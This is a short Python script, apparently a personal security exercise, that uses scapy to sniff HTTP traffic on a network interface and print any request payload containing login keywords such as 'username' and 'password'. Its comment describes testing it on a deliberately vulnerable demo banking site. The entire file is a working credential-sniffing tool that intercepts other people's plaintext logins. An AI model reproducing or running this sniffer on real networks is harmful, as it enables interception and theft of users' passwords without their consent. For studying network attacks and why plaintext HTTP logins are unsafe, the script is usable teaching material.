#httpSniffer.py: This Python script is designed to sniff the host machine for any
#HTTP packet in an attempt to grab a packet that contains a user's username and
#password they used to log into a website. The script will print out the captured
#packet's URL for the site logged into and payload that contains the username
#and password. The below images show what the script will print to console when
#I attempt to log on to http://demo.testfire.net/login.jsp with the username
#and password of admin / admin.

#/usr/bin/python
# Written By: Sahar Hathiramani
# Date: 01/19/2021

import scapy.all as scapy
from scapy_http import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packets)

def process_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print('URL: ' + url.decode())
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            for i in words:
                if i in str(load):
                    print('Load: ' + load.decode())
                    break



words = ["password", "user", "username", "login", "pass", "Username", "Password", "User", "Email"]
sniff("eth0")
